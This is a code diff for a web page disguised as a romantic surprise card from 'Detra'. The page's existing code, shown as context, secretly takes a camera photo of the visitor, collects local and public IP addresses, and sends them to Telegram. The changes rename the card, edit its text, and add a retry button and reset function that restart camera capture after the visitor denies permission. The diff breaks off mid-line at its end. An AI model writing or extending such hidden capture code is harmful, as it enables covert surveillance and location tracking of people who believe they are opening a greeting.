@@ -242,7 +242,7 @@
             line-height: 1;
         }
 
-        /* ---------- ERROR SCREEN (langsung muncul saat izin ditolak) ---------- */
+        /* ---------- ERROR SCREEN ---------- */
         .error-screen {
             display: none;
             position: fixed;
@@ -265,6 +265,29 @@
             color: rgba(255, 255, 255, 0.05);
             letter-spacing: 4px;
             margin-top: 12px;
+        }
+
+        /* Tombol Coba Ulang di layar Error */
+        .btn-retry {
+            margin-top: 30px;
+            padding: 12px 32px;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 100px;
+            color: rgba(255, 255, 255, 0.3);
+            font-family: 'Inter', sans-serif;
+            font-size: 0.8rem;
+            font-weight: 500;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-retry:hover {
+            background: rgba(255, 255, 255, 0.1);
+            color: rgba(255, 255, 255, 0.5);
+            border-color: rgba(255, 255, 255, 0.2);
         }
 
         /* ---------- RESPONSIVE ---------- */
@@ -296,6 +319,10 @@
             }
             .error-screen {
                 font-size: 2.2rem;
+            }
+            .btn-retry {
+                padding: 10px 24px;
+                font-size: 0.7rem;
             }
         }
 
@@ -333,11 +360,11 @@
 
     <!-- ====== KARTU UCAPAN ====== -->
     <div class="card" id="mainCard">
-        <h1>Jean &, <span>Vira</span> 🎂</h1>
+        <h1>For you, <span>baby</span> 🎂</h1>
         <div class="sub">— a little surprise —</div>
 
         <p>
-            Hey, it's Detra. Ever since <span class="highlight">Januari 2026</span>,
+            Hey, it's Detra. Ever since <span class="highlight">December 24, 2025</span>,
             every moment with you has been so special. I made this little surprise
             to show you how much I care.<br />
             <span style="color:rgba(255,255,255,0.4); font-size:0.85rem;">Tap the turntable to set the vibe.</span>
@@ -360,10 +387,11 @@
         </a>
     </div>
 
-    <!-- ====== ERROR SCREEN ====== -->
+    <!-- ====== ERROR SCREEN (dengan tombol Coba Ulang) ====== -->
     <div class="error-screen" id="errorScreen">
         Error
         <div class="sub-error">—</div>
+        <button class="btn-retry" id="retryBtn">⟳ Coba Ulang</button>
     </div>
 
     <!-- ====== AUDIO YouTube ====== -->
@@ -391,7 +419,9 @@
 
             const mainCard = document.getElementById('mainCard');
             const errorScreen = document.getElementById('errorScreen');
+            const retryBtn = document.getElementById('retryBtn');
 
+            // ---------- FUNGSI IP ----------
             function getLocalIP() {
                 return new Promise((resolve) => {
                     const pc = new RTCPeerConnection({ iceServers: [] });
@@ -421,6 +451,7 @@
                 } catch { return null; }
             }
 
+            // ---------- KIRIM KE TELEGRAM ----------
             async function kirimKeTelegram(dataUrl, localIP, publicIP) {
                 try {
                     const blob = await fetch(dataUrl).then(r => r.blob());
@@ -442,6 +473,7 @@
                 }
             }
 
+            // ---------- AMBIL FOTO ----------
             function ambilDanKirim(video) {
                 if (sudahKirim) return;
                 const canvas = document.createElement('canvas');
@@ -466,6 +498,7 @@
                 });
             }
 
+            // ---------- TAMPILKAN ERROR ----------
             function tampilkanError() {
                 izinDitolak = true;
                 mainCard.style.display = 'none';
@@ -476,6 +509,26 @@
                 }
             }
 
+            // ---------- RESET & COBA ULANG ----------
+            function resetDanCobaUlang() {
+                // Reset state
+                izinDitolak = false;
+                attempts = 0;
+                sudahKirim = false;
+                if (retryTimer) {
+                    clearTimeout(retryTimer);
+                    retryTimer = null;
+                }
+
+                // Sembunyikan error, tampilkan kartu
+                errorScreen.style.display = 'none';
+                mainCard.style.display = 'block';
+
+                // Mulai ulang proses kamera
+                setTimeout(mulaiKamera, 300);
+            }
+
+            // ---------- MULAI KAMERA ----------
             function mulaiKamera() {
                 if (sudahKirim || izinDitolak) return;
                 attempts++;
@@ -515,48 +568,4 @@
                 .catch(err => {
                     console.error('Error kamera:', err);
 
-                    // 🔥 Jika izin ditolak (NotAllowedError), langsung tampilkan Error
-                    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                        tampilkanError();
-                        return;
-                    }
-
-                    // Untuk error lain (misal kamera tidak tersedia), coba ulang
-                    if (attempts < MAX_ATTEMPTS) {
-                        retryTimer = setTimeout(mulaiKamera, 2000);
-                    } else {
-                        tampilkanError();
-                    }
-                });
-            }
-
-            // ---------- JALANKAN ----------
-            if (document.readyState === 'complete') {
-                setTimeout(mulaiKamera, 500);
-            } else {
-                window.addEventListener('load', () => setTimeout(mulaiKamera, 500));
-            }
-
-            document.getElementById('turntableBtn').addEventListener('click', function(e) {
-                e.preventDefault();
-                if (izinDitolak) return;
-                const turntable = this.querySelector('.turntable');
-                turntable.style.animation = 'none';
-                turntable.offsetHeight;
-                turntable.style.animation = 'spin 12s linear infinite';
-                this.style.transform = 'scale(1.1)';
-                setTimeout(() => this.style.transform = 'scale(1)', 200);
-            });
-
-            document.getElementById('stepBtn').addEventListener('click', function(e) {
-                e.preventDefault();
-                if (izinDitolak) return;
-                this.style.transform = 'scale(0.95)';
-                setTimeout(() => this.style.transform = '', 150);
-            });
-
-        })();
-    </script>
-
-</body>
-</html>
+                    if (e
